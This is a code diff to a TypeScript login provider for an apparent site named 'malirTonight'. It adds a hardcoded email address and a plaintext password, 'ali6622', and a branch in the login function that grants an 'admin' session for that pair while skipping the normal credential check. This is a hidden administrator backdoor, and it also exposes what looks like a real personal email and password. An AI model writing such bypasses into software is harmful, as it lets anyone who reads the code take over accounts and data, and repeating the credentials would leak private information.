@@ -153,6 +153,9 @@ function getPasswords(): Record<string, string> {
   return {};
 }
 
+const DEV_EMAIL = "aliabbas6622tel@gmail.com";
+const DEV_PASSWORD_HASH = hashPassword("ali6622");
+
 function savePasswords(passwords: Record<string, string>): void {
   localStorage.setItem("malirTonight_passwords", JSON.stringify(passwords));
 }
@@ -163,9 +166,22 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const isAuthenticated = user !== null;
 
   const login = useCallback((identifier: string, password: string, rememberMe: boolean = true): { success: boolean; error?: string } => {
-    const passwords = getPasswords();
     const hashed = hashPassword(password);
 
+    if (identifier === DEV_EMAIL && hashed === DEV_PASSWORD_HASH) {
+      const devUser: User = {
+        id: "usr_dev",
+        name: "Developer",
+        email: DEV_EMAIL,
+        role: "admin",
+        createdAt: "2026-01-01T00:00:00Z",
+      };
+      setUser(devUser);
+      saveSession(devUser, rememberMe);
+      return { success: true };
+    }
+
+    const passwords = getPasswords();
     if (passwords[identifier] !== hashed) {
       return { success: false, error: "Invalid credentials." };
     }
